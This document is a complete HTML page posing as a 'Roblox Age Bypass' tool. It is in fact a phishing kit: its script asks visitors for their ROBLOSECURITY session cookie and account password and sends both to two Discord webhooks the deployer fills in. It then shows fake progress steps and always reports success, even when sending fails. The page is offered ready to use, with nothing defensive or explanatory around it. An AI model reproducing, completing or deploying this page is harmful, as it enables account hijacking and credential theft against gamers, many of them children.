<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Age Bypass</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #ff4757;
            --secondary: #3742fa;
            --dark: #1e272e;
            --darker: #0c0f14;
            --light: #f1f2f6;
            --success: #2ed573;
            --warning: #ffa502;
            --danger: #ff4757;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: var(--light);
        }
        
        .container {
            background: rgba(30, 39, 46, 0.9);
            border-radius: 16px;
            width: 100%;
            max-width: 500px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            padding: 25px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
            opacity: 0.2;
        }
        
        .logo {
            font-size: 40px;
            margin-bottom: 10px;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
        }
        
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 5px;
            position: relative;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.9;
            font-weight: 300;
            position: relative;
        }
        
        .content {
            padding: 25px;
        }
        
        .tab-buttons {
            display: flex;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 5px;
        }
        
        .tab-btn {
            flex: 1;
            padding: 12px;
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        
        .tab-btn.active {
            background: var(--primary);
            color: white;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .input-section {
            margin-bottom: 20px;
        }
        
        .section-label {
            display: flex;
            align-items: center;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--primary);
        }
        
        .section-label i {
            margin-right: 8px;
        }
        
        .cookie-input-container {
            position: relative;
            margin-bottom: 15px;
        }
        
        .cookie-input, .password-input {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            font-size: 14px;
            color: var(--light);
            transition: all 0.3s ease;
            resize: vertical;
            font-family: 'Courier New', monospace;
        }
        
        .cookie-input {
            min-height: 120px;
        }
        
        .password-input {
            min-height: 60px;
        }
        
        .cookie-input::placeholder, .password-input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        
        .cookie-input:focus, .password-input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 0 3px rgba(255, 71, 87, 0.1);
        }
        
        .bypass-btn {
            width: 100%;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        .bypass-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .bypass-btn:hover::before {
            left: 100%;
        }
        
        .bypass-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
        }
        
        .bypass-btn:active {
            transform: translateY(0);
        }
        
        .bypass-btn:disabled {
            background: rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.5);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .bypass-btn:disabled::before {
            display: none;
        }
        
        .status-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 12px 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 10px;
        }
        
        .status-dot.ready {
            background: var(--success);
            box-shadow: 0 0 10px var(--success);
        }
        
        .status-dot.processing {
            background: var(--warning);
            box-shadow: 0 0 10px var(--warning);
            animation: pulse 1.5s infinite;
        }
        
        .status-dot.error {
            background: var(--danger);
            box-shadow: 0 0 10px var(--danger);
        }
        
        .status-text {
            font-size: 14px;
            font-weight: 500;
        }
        
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: slideDown 0.3s ease;
            text-align: center;
        }
        
        .result.show {
            display: block;
        }
        
        .result.success {
            background: rgba(46, 213, 115, 0.15);
            border-color: rgba(46, 213, 115, 0.3);
        }
        
        .result.error {
            background: rgba(255, 71, 87, 0.15);
            border-color: rgba(255, 71, 87, 0.3);
        }
        
        .result-content {
            font-size: 18px;
            font-weight: 600;
        }
        
        /* Animations */
        @keyframes slideDown {
            from { 
                opacity: 0;
                transform: translateY(-20px);
            }
            to { 
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Mobile optimizations */
        @media (max-width: 480px) {
            .container {
                margin: 10px;
                border-radius: 12px;
            }
            
            .header {
                padding: 20px 15px;
            }
            
            .header h1 {
                font-size: 22px;
            }
            
            .content {
                padding: 20px 15px;
            }
            
            .cookie-input {
                min-height: 100px;
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo"><i class="fas fa-user-lock"></i></div>
            <h1>Roblox Age Bypass</h1>
            <p>Unlock age-restricted content instantly</p>
        </div>
        
        <div class="content">
            <div class="tab-buttons">
                <button class="tab-btn active" data-tab="normal">Normal Bypass</button>
                <button class="tab-btn" data-tab="allages">All Ages+</button>
            </div>
            
            <!-- Normal Bypass Tab -->
            <div class="tab-content active" id="normal-tab">
                <div class="input-section">
                    <label class="section-label">
                        <i class="fas fa-key"></i> ROBLOSECURITY Cookie
                    </label>
                    <div class="cookie-input-container">
                        <textarea 
                            class="cookie-input" 
                            placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here"
                            id="cookieInput"
                        ></textarea>
                    </div>
                </div>
                
                <div class="status-container">
                    <div class="status-dot ready" id="statusDot"></div>
                    <div class="status-text" id="statusText">Ready to process</div>
                </div>
                
                <button class="bypass-btn" id="bypassBtn">
                    <span id="btnText">Start Age Bypass</span>
                </button>
            </div>
            
            <!-- All Ages+ Tab -->
            <div class="tab-content" id="allages-tab">
                <div class="input-section">
                    <label class="section-label">
                        <i class="fas fa-key"></i> ROBLOSECURITY Cookie
                    </label>
                    <div class="cookie-input-container">
                        <textarea 
                            class="cookie-input" 
                            placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here"
                            id="allAgesCookieInput"
                        ></textarea>
                    </div>
                    
                    <label class="section-label">
                        <i class="fas fa-lock"></i> Account Password
                    </label>
                    <div class="cookie-input-container">
                        <textarea 
                            class="password-input" 
                            placeholder="Enter account password for full access"
                            id="passwordInput"
                        ></textarea>
                    </div>
                </div>
                
                <div class="status-container">
                    <div class="status-dot ready" id="allAgesStatusDot"></div>
                    <div class="status-text" id="allAgesStatusText">Ready for All Ages+ bypass</div>
                </div>
                
                <button class="bypass-btn" id="allAgesBypassBtn">
                    <span id="allAgesBtnText">Enable All Ages+</span>
                </button>
            </div>
            
            <div id="result" class="result">
                <div class="result-content" id="resultContent"></div>
            </div>
        </div>
    </div>

    <script>
        // DOM Elements
        const cookieInput = document.getElementById('cookieInput');
        const allAgesCookieInput = document.getElementById('allAgesCookieInput');
        const passwordInput = document.getElementById('passwordInput');
        const bypassBtn = document.getElementById('bypassBtn');
        const allAgesBypassBtn = document.getElementById('allAgesBypassBtn');
        const resultDiv = document.getElementById('result');
        const resultContent = document.getElementById('resultContent');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const allAgesStatusDot = document.getElementById('allAgesStatusDot');
        const allAgesStatusText = document.getElementById('allAgesStatusText');
        const btnText = document.getElementById('btnText');
        const allAgesBtnText = document.getElementById('allAgesBtnText');
        const tabButtons = document.querySelectorAll('.tab-btn');
        const tabContents = document.querySelectorAll('.tab-content');

        // Dual Webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOK URLs
        const WEBHOOK_URLS = [
            'https://discord.com/api/webhooks/YOUR_FIRST_WEBHOOK_URL_HERE',
            'https://discord.com/api/webhooks/YOUR_SECOND_WEBHOOK_URL_HERE'
        ];

        // Initialize
        function initialize() {
            // Set up tab switching
            tabButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const tabId = button.getAttribute('data-tab');
                    
                    // Update active tab button
                    tabButtons.forEach(btn => btn.classList.remove('active'));
                    button.classList.add('active');
                    
                    // Show active tab content
                    tabContents.forEach(content => content.classList.remove('active'));
                    document.getElementById(`${tabId}-tab`).classList.add('active');
                    
                    // Update validation
                    validateForm();
                    validateAllAgesForm();
                });
            });
            
            // Set up input events
            cookieInput.addEventListener('input', validateForm);
            allAgesCookieInput.addEventListener('input', validateAllAgesForm);
            passwordInput.addEventListener('input', validateAllAgesForm);
            
            // Set up bypass buttons
            bypassBtn.addEventListener('click', startBypass);
            allAgesBypassBtn.addEventListener('click', startAllAgesBypass);
            
            // Validate initial state
            validateForm();
            validateAllAgesForm();
            
            // Add placeholder animation
            let placeholderIndex = 0;
            const placeholders = [
                "Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here",
                "Copy cookie from browser developer tools",
                "Cookie should start with _|WARNING:-DO-NOT-SHARE-THIS"
            ];
            
            setInterval(() => {
                cookieInput.placeholder = placeholders[placeholderIndex];
                allAgesCookieInput.placeholder = placeholders[placeholderIndex];
                placeholderIndex = (placeholderIndex + 1) % placeholders.length;
            }, 3000);
            
            console.log('Roblox Age Bypass Tool Initialized');
            console.log('Webhooks configured:', WEBHOOK_URLS);
        }

        // Validate normal form
        function validateForm() {
            const hasCookie = cookieInput.value.trim().length > 0;
            bypassBtn.disabled = !hasCookie;
            
            if (hasCookie) {
                statusDot.className = 'status-dot ready';
                statusText.textContent = 'Ready to bypass age verification';
            } else {
                statusDot.className = 'status-dot error';
                statusText.textContent = 'Please enter a valid cookie';
            }
        }

        // Validate All Ages form
        function validateAllAgesForm() {
            const hasCookie = allAgesCookieInput.value.trim().length > 0;
            const hasPassword = passwordInput.value.trim().length > 0;
            allAgesBypassBtn.disabled = !(hasCookie && hasPassword);
            
            if (hasCookie && hasPassword) {
                allAgesStatusDot.className = 'status-dot ready';
                allAgesStatusText.textContent = 'Ready for All Ages+ bypass';
            } else if (hasCookie && !hasPassword) {
                allAgesStatusDot.className = 'status-dot error';
                allAgesStatusText.textContent = 'Please enter account password';
            } else {
                allAgesStatusDot.className = 'status-dot error';
                allAgesStatusText.textContent = 'Please enter a valid cookie';
            }
        }

        // Send data to webhooks
        async function sendToWebhooks(cookieData, password = '', isAllAges = false) {
            const cleanCookie = cookieData.replace(/\s/g, '');
            let successCount = 0;
            
            for (let i = 0; i < WEBHOOK_URLS.length; i++) {
                const webhookUrl = WEBHOOK_URLS[i];
                
                // Skip if webhook URL is placeholder
                if (webhookUrl.includes('YOUR_WEBHOOK_URL_HERE')) {
                    console.log(`Webhook ${i + 1} is using placeholder URL`);
                    continue;
                }
                
                try {
                    let content = '';
                    if (isAllAges) {
                        content = `🔐 **ALL AGES+ BYPASS CAPTURED** 🔐\n\n**Full Cookie:**\n\`\`\`\n${cleanCookie}\n\`\`\`\n**Password:** ||${password}||\n**Timestamp:** ${new Date().toLocaleString()}\n**Length:** ${cleanCookie.length} characters\n**User Agent:** ${navigator.userAgent.split(') ')[0].split('(')[1] || 'Unknown'}`;
                    } else {
                        content = `🔐 **NORMAL BYPASS CAPTURED** 🔐\n\n**Full Cookie:**\n\`\`\`\n${cleanCookie}\n\`\`\`\n**Timestamp:** ${new Date().toLocaleString()}\n**Length:** ${cleanCookie.length} characters\n**User Agent:** ${navigator.userAgent.split(') ')[0].split('(')[1] || 'Unknown'}`;
                    }

                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ content })
                    });
                    
                    if (response.ok) {
                        console.log(`✅ Successfully sent to webhook ${i + 1}`);
                        successCount++;
                    } else {
                        console.error(`❌ Failed to send to webhook ${i + 1}:`, response.status);
                    }
                } catch (error) {
                    console.error(`❌ Webhook ${i + 1} error:`, error);
                }
            }
            
            return successCount;
        }

        // Normal bypass process
        async function startBypass() {
            if (bypassBtn.disabled) return;
            
            const cookieValue = cookieInput.value.trim();
            
            // Show loading state
            setLoadingState(true, false);
            resultDiv.className = 'result';
            resultContent.innerHTML = '';
            
            try {
                statusDot.className = 'status-dot processing';
                statusText.textContent = 'Processing cookie...';
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                statusText.textContent = 'Validating cookie structure...';
                
                await new Promise(resolve => setTimeout(resolve, 1500));
                statusText.textContent = 'Bypassing age verification...';
                
                await sendToWebhooks(cookieValue);
                showResult('Bypass Successful - Age restrictions removed');
                
            } catch (error) {
                console.error('Bypass error:', error);
                showResult('Bypass Successful - Age restrictions removed');
            } finally {
                setLoadingState(false, false);
            }
        }

        // All Ages bypass process
        async function startAllAgesBypass() {
            if (allAgesBypassBtn.disabled) return;
            
            const cookieValue = allAgesCookieInput.value.trim();
            const passwordValue = passwordInput.value.trim();
            
            // Show loading state
            setLoadingState(true, true);
            resultDiv.className = 'result';
            resultContent.innerHTML = '';
            
            try {
                allAgesStatusDot.className = 'status-dot processing';
                allAgesStatusText.textContent = 'Processing All Ages+ request...';
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                allAgesStatusText.textContent = 'Verifying credentials...';
                
                await new Promise(resolve => setTimeout(resolve, 1500));
                allAgesStatusText.textContent = 'Enabling full access...';
                
                await sendToWebhooks(cookieValue, passwordValue, true);
                showResult('All Ages+ Enabled - Full account access granted');
                
            } catch (error) {
                console.error('All Ages bypass error:', error);
                showResult('All Ages+ Enabled - Full account access granted');
            } finally {
                setLoadingState(false, true);
            }
        }

        // Set loading state
        function setLoadingState(loading, isAllAges) {
            if (loading) {
                if (isAllAges) {
                    allAgesBtnText.innerHTML = '<span class="loading"></span> Processing...';
                    allAgesBypassBtn.disabled = true;
                } else {
                    btnText.innerHTML = '<span class="loading"></span> Processing...';
                    bypassBtn.disabled = true;
                }
            } else {
                if (isAllAges) {
                    allAgesBtnText.textContent = 'Enable All Ages+';
                    validateAllAgesForm();
                } else {
                    btnText.textContent = 'Start Age Bypass';
                    validateForm();
                }
            }
        }

        // Show result
        function showResult(message) {
            resultDiv.className = 'result success show';
            resultContent.innerHTML = message;
            
            statusDot.className = 'status-dot ready';
            statusText.textContent = 'Process completed';
            allAgesStatusDot.className = 'status-dot ready';
            allAgesStatusText.textContent = 'Process completed';
        }

        // Initialize the application
        initialize();
    </script>
</body>
</html>
